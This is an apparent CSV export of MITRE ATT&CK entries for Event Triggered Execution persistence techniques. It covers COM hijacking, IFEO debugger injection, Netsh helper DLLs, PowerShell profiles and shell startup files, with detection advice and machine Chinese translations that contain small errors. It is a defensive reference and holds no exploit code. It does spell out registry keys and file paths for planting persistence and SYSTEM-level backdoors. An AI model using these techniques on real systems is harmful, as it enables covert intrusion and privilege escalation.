T1546.015,Event Triggered Execution: Component Object Model Hijacking,"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. 

Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ",https://attack.mitre.org/techniques/T1546/015,16 March 2020,10 November 2020,1.0,"Persistence, Privilege Escalation","There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](https://attack.mitre.org/software/S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\Software\Classes\CLSID\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\.(Citation: Elastic COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  

Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. ",Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,Elastic,User,,,,,,"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: NorthSec 2015 GData Uroburos Tools),(Citation: Medium KONNI Jan 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Check Point Warzone Feb 2020),(Citation: ESET Sednit Part 2),(Citation: Palo Alto Networks BBSRAT),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: ESET Zebrocy May 2019),(Citation: Talos Seduploader Oct 2017),(Citation: ESET Sednit Part 1),",事件触发执行：组件对象模型劫持,攻击者可以通过执行由对组件对象模型 (COM) 对象的劫持引用触发的恶意内容来建立持久性。 COM 是 Windows 中的一个系统，可通过操作系统实现软件组件之间的交互。（引用：Microsoft 组件对象模型）对各种 COM 对象的引用存储在注册表中。攻击者可以使用 COM 系统插入恶意代码，通过劫持 COM 引用和关系作为持久性手段，这些代码可以代替合法软件执行。劫持 COM 对象需要更改注册表以替换对合法系统组件的引用，这可能导致该组件在执行时无法工作。当该系统组件通过正常系统操作执行时，攻击者的代码将被执行。（引用：GDATA COM 劫持）攻击者可能劫持经常使用的对象以保持一致的持久性水平，但不太可能破坏系统内的显着功能，以避免可能导致检测的系统不稳定。
T1546.014,Event Triggered Execution: Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.

The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)

Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.",https://attack.mitre.org/techniques/T1546/014,24 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation",Monitor emond rules creation by checking for files created or modified in <code>/etc/emond.d/rules/</code> and <code>/private/var/db/emondClients</code>.,macOS,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1546,,Ivan Sinyakov,Administrator,,,,,,",",事件触发执行：事件监视程序守护程序/Emond,攻击者可以通过执行由 Event Monitor Daemon (emond) 触发的恶意内容来获得持久性并提升特权。 Emond 是一个 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)，它接受来自各种服务的事件，通过一个简单的规则引擎运行它们，并采取行动。 <code>/sbin/emond</code> 中的 emond 二进制文件将从 <code>/etc/emond.d/rules/</code> 目录加载任何规则，并在明确定义的事件发生后采取行动。规则文件采用 plist 格式并定义名称、事件类型和要采取的操作。事件类型的一些示例包括系统启动和用户身份验证。操作的示例是运行系统命令或发送电子邮件。如果在 [Launch Daemon](https://attack.mitre.org/技术/T1543/004）配置文件位于<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>。（引用：xorrior emond Jan 2018）（引用：magnusviri emond Apr 2016）（引用： sentinelone macos 持续 2019 年 6 月）攻击者可能会通过编写规则来滥用此服务，以在发生定义的事件时执行命令，例如系统启动或用户身份验证。（引用：xorrior emond Jan 2018）（引用：magnusviri emond Apr 2016）（引用：sentinelone macos 持续 2019 年 6 月）攻击者也可以将权限从管理员升级到 root，因为 emond 服务由 [Launch Daemon] 以 root 权限执行（https://attack.mitre.org/techniques/T1543/ 004) 服务。
T1546.012,Event Triggered Execution: Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the ""debugger"" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.

Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",https://attack.mitre.org/techniques/T1546/012,24 January 2020,10 November 2020,1.1,"Persistence, Privilege Escalation","Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)

Monitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,"Oddvar Moe, @oddvarmoe","Administrator, SYSTEM",,,,,,"(Citation: FireEye TRITON 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Proofpoint TA505 October 2019),",事件触发执行：图像文件执行选项注入,"攻击者可以通过执行由图像文件执行选项 (IFEO) 调试器触发的恶意内容来建立持久性和/或提升特权。 IFEO 使开发人员能够将调试器附加到应用程序。创建进程时，应用程序的 IFEO 中的调试器将附加到应用程序的名称前，从而有效地在调试器下启动新进程（例如，<code>C:\dbg\ntsd.exe -g notepad.exe</代码>）。 （引用：Microsoft 开发博客 IFEO 2010 年 3 月）可以通过注册表直接设置 IFEO，也可以通过 GFlags 工具在全局标志中设置 IFEO。 （引用：Microsoft GFlags Mar 2017）IFEO 在 <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable 下的注册表中表示为 <code>Debugger</code> 值></code> 其中 <code>&lt;executable&gt;</code> 是附加调试器的二进制文件。 （引用：Microsoft 开发博客 IFEO 2010 年 3 月） IFEO 还可以在指定程序静默退出（即被自身或第二个非内核模式进程提前终止）时启动任意监控程序。 （引用：Microsoft Silent Process Exit NOV 2017）（引用：Oddvar Moe IFEO APR 2018）与调试器类似，可以通过 GFlags 和/或直接修改 <code>HKEY_LOCAL_MACHINE\ 中的 IFEO 和静默进程退出注册表值来启用静默退出监控SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>。 （引用：Microsoft Silent Process Exit NOV 2017）（引用：Oddvar Moe IFEO APR 2018）类似于 [辅助功能](https://attack.mitre.org/techniques/T1546/008)，在 Windows Vista 及更高版本上也是如此作为 Windows Server 2008 及更高版本，可以修改注册表项，将“cmd.exe”或其他提供后门访问的程序配置为可访问性程序（例如：utilman.exe）的“调试器”。修改注册表后，在使用键盘或连接[远程桌面协议]（https://attack.mitre.org/techniques/T1021/001）时在登录屏幕上按相应的组合键将导致“调试器"" 以 SYSTEM 权限执行的程序。 （引用：Tilbury 2014）与 [Process Injection](https://attack.mitre.org/techniques/T1055) 类似，这些值也可能被滥用以通过导致恶意可执行文件在计算机上不同进程的上下文。 （引用：Elastic Process Injection 2017 年 7 月）安装 IFEO 机制还可以通过持续触发调用提供持久性。恶意软件还可能通过注册无效调试器来重定向和有效禁用各种系统和安全应用程序，从而使用 IFEO [削弱防御](https://attack.mitre.org/techniques/T1562)。 （引用：FSecure Hupigon）（引用：赛门铁克 Ushedix 2008 年 6 月）"
T1546.016,Event Triggered Execution: Installer Packages,"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)

Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)

Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.

For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. Adversaries have leveraged `Prebuild` and `Postbuild` events to run commands before or after a build when installing .msi files.(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)",https://attack.mitre.org/techniques/T1546/016,27 September 2022,19 October 2022,1.0,"Persistence, Privilege Escalation",,"Linux, Windows, macOS","Command: Command Execution, File: File Creation, Process: Process Creation",True,T1546,,Brandon Dalton @PartyD0lphin,User,,,,,root,"(Citation: ObjectiveSee AppleJeus 2019),",事件触发执行：安装程序包,攻击者可以通过使用安装程序触发恶意内容的执行来建立持久性并提升权限。安装程序包是特定于操作系统的，包含操作系统在系统上安装应用程序所需的资源。安装程序包可以包括在安装之前和安装完成之后运行的脚本。安装程序脚本在执行时可能会继承提升的权限。开发人员经常使用这些脚本来准备安装环境、检查需求、下载依赖项以及在安装后删除文件。（引用：Installer Package Scripting Rich Trouton）攻击者使用合法应用程序分发带有修改过的安装程序脚本的应用程序来执行恶意内容。当用户安装应用程序时，他们可能需要授予管理权限以允许安装。在合法应用程序的安装过程结束时，可以使用继承的提升权限执行 macOS `postinstall` 脚本等内容。攻击者可以使用这些脚本执行恶意可执行文件或安装具有提升权限的其他恶意组件（例如 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)）。（引用：应用程序Bundle Manipulation Brandon Dalton）（引用：wardle evilquest parti）根据发行版的不同，Linux 版本的包安装程序脚本有时称为维护者脚本或安装后脚本。这些脚本可以包括 `preinst`、`postinst`、`prerm`、`postrm` 脚本，并在执行时以 root 身份运行。对于 Windows，Microsoft 安装程序服务使用 `.msi` 文件来管理应用程序的安装、更新和卸载。在安装 .msi 文件时，攻击者利用 `Prebuild` 和 `Postbuild` 事件在构建之前或之后运行命令。（引用：Windows AppleJeus GReAT）（引用：Debian 手册维护者脚本）
T1546.006,Event Triggered Execution: LC_LOAD_DYLIB Addition,"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.

Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)",https://attack.mitre.org/techniques/T1546/006,24 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation",Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.,macOS,"Command: Command Execution, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation",True,T1546,,,User,,,,,,",",事件触发执行：LC_LOAD_DYLIB 添加,攻击者可以通过执行受污染的二进制文件触发的恶意内容来建立持久性。 Mach-O 二进制文件有一系列头文件，用于在加载二进制文件时执行某些操作。 Mach-O 二进制文件中的 LC_LOAD_DYLIB 标头告诉 macOS 和 OS X 在执行期间要加载哪些动态库 (dylib)。只要对其余字段和依赖项进行调整，就可以将这些临时添加到已编译的二进制文件中。（引用：为 OSX 编写不良恶意软件）有一些工具可用于执行这些更改。每次执行二进制文件时，攻击者可能会修改 Mach-O 二进制标头以加载和执行恶意 dylib。尽管任何更改都会使二进制文件上的数字签名无效，因为二进制文件正在被修改，但这可以通过简单地从二进制文件中删除 LC_CODE_SIGNATURE 命令来修复，以便在加载时不检查签名。（引用：OS X 上的恶意软件持久性）
T1546.007,Event Triggered Execution: Netsh Helper DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.

Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)",https://attack.mitre.org/techniques/T1546/007,24 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation",It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\SOFTWARE\Microsoft\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software.(Citation: Demaske Netsh Persistence),Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,"Matthew Demaske, Adaptforward","Administrator, SYSTEM",,,,,,"(Citation: Demaske Netsh Persistence),",事件触发执行：Netsh Helper DLL,攻击者可以通过执行由 Netsh Helper DLL 触发的恶意内容来建立持久性。 Netsh.exe（也称为 Netshell）是一个命令行脚本实用程序，用于与系统的网络配置进行交互。它包含添加帮助 DLL 以扩展实用程序功能的功能。（引用：TechNet Netsh）已注册的 netsh.exe 帮助 DLL 的路径输入到 Windows 注册表的 <code>HKLM\SOFTWARE\Microsoft\Netsh</code> .攻击者可以使用 netsh.exe 帮助程序 DLL 以持久的方式触发任意代码的执行。此执行将在任何时候执行 netsh.exe 时发生，这可能会自动发生，使用另一种持久性技术，或者如果系统上存在执行 netsh.exe 作为其正常功能的一部分的其他软件（例如：VPN）。（引文: Github Netsh Helper CS Beacon)(引用: Demaske Netsh Persistence)
T1546.013,Event Triggered Execution: PowerShell Profile,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.

[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) 

Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) 

An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",https://attack.mitre.org/techniques/T1546/013,24 January 2020,08 February 2022,1.1,"Persistence, Privilege Escalation","Locations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet)(Citation: Microsoft Profiles) Example profile locations (user defaults as well as program-specific) include:

* <code>$PsHome\Profile.ps1</code>
* <code>$PsHome\Microsoft.{HostProgram}_profile.ps1</code>
* <code>$Home\\\[My ]Documents\PowerShell\Profile.ps1</code>
* <code>$Home\\\[My ]Documents\PowerShell\Microsoft.{HostProgram}_profile.ps1</code>

Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.",Windows,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1546,,"Allen DeRyke, ICE; Matthew Green","Administrator, User",,,,,,"(Citation: ESET Turla PowerShell May 2019),",事件触发执行：PowerShell 配置文件,攻击者可以通过执行由 PowerShell 配置文件触发的恶意内容来获得持久性并提升权限。 PowerShell 配置文件 (<code>profile.ps1</code>) 是在 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 启动时运行的脚本，可用作登录脚本自定义用户环境。 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 支持多个配置文件，具体取决于用户或主机程序。例如，[PowerShell](https://attack.mitre.org/techniques/T1059/001) 主机程序（如 PowerShell 控制台、PowerShell ISE 或 Visual Studio Code）可以有不同的配置文件。管理员还可以配置适用于本地计算机上的所有用户和主机程序的配置文件。 （引用：Microsoft 关于配置文件）攻击者可能会修改这些配置文件以包含任意命令、功能、模块和/或 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 驱动器以获得持久性。每次用户打开 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 会话时，修改后的脚本将被执行，除非使用了 <code>-NoProfile</code> 标志。推出。 （引用：ESET Turla PowerShell 2019 年 5 月）如果 PowerShell 配置文件中的脚本由具有更高权限的帐户（例如域管理员）加载和执行，攻击者也可能能够提升权限。 （引文：Wits End and Shady PowerShell Profiles）
T1546.002,Event Triggered Execution: Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.

The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:

* <code>SCRNSAVE.exe</code> - set to malicious PE path
* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver
* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock
* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed

Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)",https://attack.mitre.org/techniques/T1546/002,24 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation","Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.

Tools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.",Windows,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,Bartosz Jerzman,User,,,,,,"(Citation: ESET Gazer Aug 2017),(Citation: TechNet Screensaver GP)",事件触发执行：屏幕保护程序,攻击者可以通过执行由用户不活动触发的恶意内容来建立持久性。屏幕保护程序是在用户不活动的可配置时间后执行的程序，由具有 .scr 文件扩展名的可移植可执行 (PE) 文件组成。（引用：维基百科屏幕保护程序）Windows 屏幕保护程序应用程序 scrnsave.scr 位于 64 位 Windows 系统上的 <code>C:\ Windows\System32\</code> 和 <code>C:\Windows\sysWOW64\</code>，以及基本 Windows 安装中包含的屏幕保护程序。以下屏幕保护程序设置存储在注册表中 (<code>HKCU\Control Panel\Desktop\</code>) 并且可以被操纵以实现持久性： * <code>SCRNSAVE.exe</code> - 设置为恶意 PE 路径* <code>ScreenSaveActive</code> - 设置为“1”以启用屏幕保护程序 * <code>ScreenSaverIsSecure</code> - 设置为“0”以不需要密码即可解锁 * <code>ScreenSaveTimeout</code> - 在执行屏幕保护程序之前设置用户不活动超时 攻击者可以使用屏幕保护程序设置来保持持久性，方法是将屏幕保护程序设置为在用户不活动的特定时间范围后运行恶意软件。（引用：ESET Gazer 2017 年 8 月）
T1546.005,Event Triggered Execution: Trap,"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.

Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where ""command list"" will be executed when ""signals"" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)",https://attack.mitre.org/techniques/T1546/005,24 January 2020,24 March 2020,1.0,"Persistence, Privilege Escalation","Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1546,,,"Administrator, User",,,,,,",",事件触发执行：陷阱,攻击者可以通过执行由中断信号触发的恶意内容来建立持久性。 <code>trap</code> 命令允许程序和shell 指定将在接收到中断信号时执行的命令。一种常见的情况是脚本允许优雅地终止和处理常见的键盘中断，如 <code>ctrl+c</code> 和 <code>ctrl+d</code>。攻击者可以使用它来注册当 shell 遇到特定中断时要执行的代码作为持久性机制。 Trap 命令的格式如下 <code>trap 'command list' signals</code> 其中“command list”将在收到“信号”时执行。（引文：陷阱手册）（引文：Cyberciti Trap Statements）
T1546.004,Event Triggered Execution: Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. 

Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. 

For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",https://attack.mitre.org/techniques/T1546/004,24 January 2020,20 August 2021,2.1,"Persistence, Privilege Escalation","While users may customize their shell profile files, there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.

Monitor for changes to <code>/etc/profile</code> and <code>/etc/profile.d</code>, these files should only be modified by system administrators. MacOS users can leverage Endpoint Security Framework file events monitoring these specific files.(Citation: ESF_filemonitor) 

For most Linux and macOS systems, a list of file paths for valid shell options available on a system are located in the <code>/etc/shells</code> file.
","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1546,,"Robert Wilson; Tony Lambert, Red Canary","Administrator, User",,,,,,"(Citation: Anomali Linux Rabbit 2018),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),",事件触发执行：Unix Shell 配置修改,攻击者可以通过执行由用户的 shell 触发的恶意命令来建立持久性。用户 [Unix Shell](https://attack.mitre.org/techniques/T1059/004) 根据事件在整个会话的不同点执行多个配置脚本。例如，当用户打开命令行界面或远程登录（例如通过 SSH）时，会启动登录 shell。登录 shell 从系统 (<code>/etc</code>) 和用户的主目录 (<code>~/</code>) 执行脚本来配置环境。系统上的所有登录 shell 在启动时都使用 /etc/profile。这些配置脚本在其目录的权限级别运行，通常用于设置环境变量、创建别名和自定义用户环境。当 shell 退出或终止时，会执行额外的 shell 脚本以确保 shell 正确退出。攻击者可能会尝试通过将命令插入 shell 自动执行的脚本来建立持久性。以 bash 为例，大多数 GNU/Linux 系统的默认 shell，攻击者可能会将启动恶意二进制文件的命令添加到 <code>/etc/profile</code> 和 <code>/etc/profile.d</code > 文件。（引用：intezer-kaiji-malware）（引用：bencane blog bashrc）这些文件通常需要 root 权限才能修改，并且每次系统上的任何 shell 启动时都会执行。对于用户级别的权限，攻击者可以将恶意命令插入到来源的 <code>~/.bash_profile</code>、<code>~/.bash_login</code> 或 <code>~/.profile</code> 中当用户打开命令行界面或远程连接时。（引用：anomali-rocke-tactics）（引用：Linux 手动 bash 调用）由于系统仅执行列出的顺序中的第一个现有文件，因此攻击者使用了 <code> ~/.bash_profile</code> 以确保执行。攻击者还利用了 <code>~/.bashrc</code> 文件，如果远程建立连接或打开额外的交互式 shell（例如命令行界面中的新选项卡），则会额外执行该文件。（引用： Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) 一些恶意软件以终止程序为目标来触发执行，攻击者可以使用<code>~/.bash_logout</ code> 